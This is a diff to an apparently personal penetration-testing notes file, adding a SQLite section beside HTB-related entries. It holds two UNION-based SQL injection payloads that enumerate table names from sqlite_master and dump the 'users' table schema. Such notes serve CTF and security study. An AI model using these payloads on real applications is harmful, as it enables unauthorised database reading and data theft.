@@ -189,6 +189,13 @@ Notice, a lot of the text below and lots of other stuff is not the work of mysel
 
   - HTB-Mango
 
+- SQLite
+  - Can utilise union exploit. The union query needs the count of selected columns from both queries is equal. So we will identify the columns count first later.
+    - Get Tables
+      `injected hehe’ union select name,1 from sqlite_master where type='table' and name not like 'sqlite_%'--;`
+    - Get Columns
+      `injected hehe' union select sql,1 from sqlite_master where tbl_name = 'users' and type = 'table';--`
+
 ## LFI/RFI
 
 - Use Nikto, which will sometimes return LFI/RFI
